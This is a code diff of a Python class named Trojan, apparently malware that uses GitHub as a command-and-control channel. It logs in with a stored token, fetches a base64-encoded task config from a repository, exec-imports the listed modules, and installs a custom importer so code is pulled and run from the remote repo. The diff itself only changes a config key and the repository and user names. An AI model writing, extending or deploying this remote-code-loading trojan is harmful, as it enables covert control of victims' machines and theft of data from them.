@@ -39,8 +39,8 @@ class Trojan:
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
-            if task['module'] not in sys.modules:
-                exec("import %s" % task['module'])
+            if task['modules'] not in sys.modules:
+                exec("import %s" % task['modules'])
         return config
     
     def module_runner(self, module):
@@ -65,14 +65,15 @@ class Trojan:
 def github_connect():
     with open('token.txt', 'r') as f:
         token = f.read()
-        user = 'yarkhan02'
+        user = 'YarKhan02'
         sess = github3.login(token=token)
-        return sess.repository(user, 'trojan')
+        return sess.repository(user, 'Trojan')
     
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
+    # print(sys.meta_path)
     trojan = Trojan('abc')
     trojan.run()
